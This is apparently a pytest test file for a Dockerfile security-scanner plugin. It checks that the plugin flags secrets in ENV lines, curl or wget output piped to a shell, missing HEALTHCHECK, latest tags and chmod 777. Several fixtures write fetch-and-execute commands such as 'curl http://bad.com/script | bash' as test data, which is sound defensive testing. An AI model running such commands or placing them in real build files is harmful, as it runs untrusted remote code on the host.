"""Tests for DockerImageScanPlugin."""

from __future__ import annotations
import asyncio
import pytest

from vibee_hacker.core.models import Target, Severity
from vibee_hacker.plugins.whitebox.docker_image_scan import DockerImageScanPlugin


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


@pytest.fixture
def plugin():
    return DockerImageScanPlugin()


@pytest.fixture
def dockerfile_dir(tmp_path):
    """Return a tmp_path with an empty Dockerfile."""
    (tmp_path / "Dockerfile").write_text("FROM ubuntu:20.04\nHEALTHCHECK CMD true\n")
    return tmp_path


class TestIsApplicable:
    def test_is_applicable_with_path(self, plugin, tmp_path):
        target = Target(path=str(tmp_path))
        assert plugin.is_applicable(target) is True

    def test_not_applicable_without_path(self, plugin):
        target = Target(url="https://example.com")
        assert plugin.is_applicable(target) is False

    def test_not_applicable_none_path(self, plugin):
        target = Target()
        assert plugin.is_applicable(target) is False


class TestSecretInEnv:
    def test_secret_in_env_detected(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nENV DB_PASSWORD=secret123\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        titles = [r.title for r in results]
        assert any("Secret in ENV" in t for t in titles)

    def test_secret_in_env_severity_critical(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nENV APP_SECRET=abc\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        secret_results = [r for r in results if "Secret in ENV" in r.title]
        assert secret_results
        assert secret_results[0].base_severity == Severity.CRITICAL

    def test_token_in_env_detected(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nENV API_TOKEN=xyz\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert any("Secret in ENV" in r.title for r in results)


class TestPipeToShell:
    def test_curl_pipe_to_bash_detected(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nRUN curl https://example.com/setup.sh | bash\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert any("Pipe to shell from curl" in r.title for r in results)

    def test_wget_pipe_to_sh_detected(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nRUN wget https://example.com/script.sh | sh\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert any("Pipe to shell from wget" in r.title for r in results)

    def test_pipe_to_shell_severity_high(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nRUN curl http://bad.com/script | bash\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        pipe_results = [r for r in results if "Pipe to shell from curl" in r.title]
        assert pipe_results[0].base_severity == Severity.HIGH


class TestNoHealthcheck:
    def test_no_healthcheck_detected(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text("FROM ubuntu:20.04\nRUN echo hello\n")
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert any("No HEALTHCHECK" in r.title for r in results)

    def test_healthcheck_present_no_finding(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nHEALTHCHECK CMD curl -f http://localhost/ || exit 1\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert not any("No HEALTHCHECK" in r.title for r in results)


class TestLatestTag:
    def test_latest_tag_detected(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:latest\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert any("latest tag" in r.title for r in results)

    def test_pinned_version_no_latest_finding(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert not any("latest tag" in r.title for r in results)


class TestCleanDockerfile:
    def test_clean_dockerfile_no_critical_findings(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\n"
            "RUN apt-get install -y --no-install-recommends curl\n"
            "HEALTHCHECK CMD curl -f http://localhost/ || exit 1\n"
            "CMD [\"echo\", \"hello\"]\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        critical = [r for r in results if r.base_severity == Severity.CRITICAL]
        high = [r for r in results if r.base_severity == Severity.HIGH]
        assert not critical
        assert not high

    def test_no_dockerfile_returns_empty(self, plugin, tmp_path):
        # No Dockerfile in directory
        (tmp_path / "README.md").write_text("just a readme")
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert results == []

    def test_url_target_returns_empty(self, plugin):
        target = Target(url="https://example.com")
        results = run(plugin.run(target))
        assert results == []


class TestChmod777:
    def test_chmod_777_detected(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nRUN chmod 777 /app\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert any("World-writable" in r.title for r in results)

    def test_chmod_777_severity_high(self, plugin, tmp_path):
        (tmp_path / "Dockerfile").write_text(
            "FROM ubuntu:20.04\nRUN chmod 777 /tmp/data\nHEALTHCHECK CMD true\n"
        )
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        chmod_results = [r for r in results if "World-writable" in r.title]
        assert chmod_results[0].base_severity == Severity.HIGH


class TestMultipleDockerfiles:
    def test_scans_nested_dockerfile(self, plugin, tmp_path):
        subdir = tmp_path / "service"
        subdir.mkdir()
        (subdir / "Dockerfile").write_text("FROM alpine:latest\n")
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        # should find latest tag + no healthcheck
        assert any("latest tag" in r.title for r in results)
        assert any("No HEALTHCHECK" in r.title for r in results)

    def test_containerfile_also_scanned(self, plugin, tmp_path):
        (tmp_path / "Containerfile").write_text("FROM ubuntu:latest\n")
        target = Target(path=str(tmp_path))
        results = run(plugin.run(target))
        assert any("latest tag" in r.title for r in results)
